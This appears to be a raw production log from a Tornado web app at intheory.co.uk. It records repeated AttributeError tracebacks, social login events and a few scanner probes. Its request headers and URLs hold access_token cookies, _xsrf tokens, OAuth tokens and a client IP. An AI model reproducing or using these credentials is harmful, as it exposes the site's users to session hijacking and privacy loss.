HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1349455349.1349457368.6; __utmb=188782963.1.10.1349457368; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '109.155.226.124', 'X-Privly-Version': '0.0.7'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.56ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1349455349.1349457368.6; __utmb=188782963.1.10.1349457368; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124', 'X-Privly-Version': '0.0.7'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.74ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1349455349.1349457368.6; __utmb=188782963.1.10.1349457368; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124', 'X-Privly-Version': '0.0.7'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.53ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124', 'X-Privly-Version': '0.0.7'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.66ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124', 'X-Privly-Version': '0.0.7'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 3.05ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3', 'X-Real-Ip': '109.155.226.124', 'X-Privly-Version': '0.0.7'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 2.38ms
WARNING:root:Missing OAuth request token cookie
WARNING:root:500 GET /login/twitter?oauth_token=EHuQcCJ8CEggCX4gmThE0X4MD33oWNSX16XMhBbyYvk&oauth_verifier=9gLX5tJau4164f8Ds0Um8H7jAxoYcqfc3ZZq6ghh84 (127.0.0.1): Twitter auth failed
ERROR:root:500 GET /login/twitter?oauth_token=EHuQcCJ8CEggCX4gmThE0X4MD33oWNSX16XMhBbyYvk&oauth_verifier=9gLX5tJau4164f8Ds0Um8H7jAxoYcqfc3ZZq6ghh84 (127.0.0.1) 2.79ms
WARNING:root:404 GET /h (127.0.0.1) 0.81ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 7.44ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 7.42ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'Cookie': '__utma=188782963.68603880.1347963502.1347968284.1348067779.3; __utmz=188782963.1347963502.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFIdmd6WkJ4T0lIVlpDTTl2QjZ6ekg4WERtc3lXbEtBWFQ4eFV4VllQNWJ2WUZaQ2NoQjNsUUhqUW92SG5QT1RjUmVqWkFMcHdSRFNONHgyUGs4YUU2SHQzMDc3UndaRFpE|1347964154|3874870678214437131524f117558b4ec38def3b; _xsrf=bd8b9e9c35f14e82aa50cef195e8a87c', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.45ms
WARNING:root:405 HEAD / (127.0.0.1) 0.73ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8000:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
www.intheory.co.uk
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
INFO:intheory-8002:Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
intheory.co.uk
INFO:intheory-8000:intheory.co.uk
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
intheory.co.uk
INFO:intheory-8002:intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (95.211.109.76) 0.83ms
intheory.co.uk
INFO:intheory-8000:intheory.co.uk
intheory.co.uk
INFO:intheory-8002:intheory.co.uk
intheory.co.uk
INFO:intheory-8003:intheory.co.uk
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.10 Safari/537.11', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=bfa32809b9434dc5b19e6536f9c32ee6; access_token="QUFBRzZsTmNzNkdjQkFDcFpCb3FVTmlrWTZaQklYVHU4SU5wcVhOR0Y4Nk1BemhtYWk0VjJFOGh5d0xudlFaQk1KcnpYQW5aQWQxcVpCWG1BOFdvNjVZSG1PZlF2Q1V5TmtYZEloVHlaQ3pMQVpEWkQ=|1347918462|dc71e1f475e3463b6fe329feb3f914be82a4d8d1"; __utma=188782963.93926689.1347918435.1347918435.1347967812.2; __utmc=188782963; __utmz=188782963.1347918435.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 71.96ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'Cookie': '__utma=188782963.68603880.1347963502.1347968284.1348067779.3; __utmz=188782963.1347963502.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFIdmd6WkJ4T0lIVlpDTTl2QjZ6ekg4WERtc3lXbEtBWFQ4eFV4VllQNWJ2WUZaQ2NoQjNsUUhqUW92SG5QT1RjUmVqWkFMcHdSRFNONHgyUGs4YUU2SHQzMDc3UndaRFpE|1347964154|3874870678214437131524f117558b4ec38def3b; _xsrf=bd8b9e9c35f14e82aa50cef195e8a87c', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 6.20ms
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'Cookie': '__utma=188782963.68603880.1347963502.1347968284.1348067779.3; __utmz=188782963.1347963502.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFIdmd6WkJ4T0lIVlpDTTl2QjZ6ekg4WERtc3lXbEtBWFQ4eFV4VllQNWJ2WUZaQ2NoQjNsUUhqUW92SG5QT1RjUmVqWkFMcHdSRFNONHgyUGs4YUU2SHQzMDc3UndaRFpE|1347964154|3874870678214437131524f117558b4ec38def3b; _xsrf=bd8b9e9c35f14e82aa50cef195e8a87c', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 5.40ms
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
Facebook user with id 507055368e4c850b148c2e65 has successfully logged in.
INFO:intheory-8001:Facebook user with id 507055368e4c850b148c2e65 has successfully logged in.
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 507057e98e4c850aff8491ac has successfully logged in.
INFO:intheory-8003:Facebook user with id 507057e98e4c850aff8491ac has successfully logged in.
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8000:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8003:www.intheory.co.uk
WARNING:root:404 GET /learn/undefined.webm (127.0.0.1) 1.38ms
WARNING:root:404 GET /learn/undefined.mp4 (127.0.0.1) 1.39ms
WARNING:root:404 GET /learn/undefined.webm (127.0.0.1) 2.14ms
WARNING:root:404 GET /learn/undefined.mp4 (127.0.0.1) 1.28ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 3.57ms
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
Facebook user with id 506f12218e4c85661e8a13f3 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f12218e4c85661e8a13f3 has successfully logged in.
www.intheory.co.uk
INFO:intheory-8001:www.intheory.co.uk
www.intheory.co.uk
INFO:intheory-8002:www.intheory.co.uk
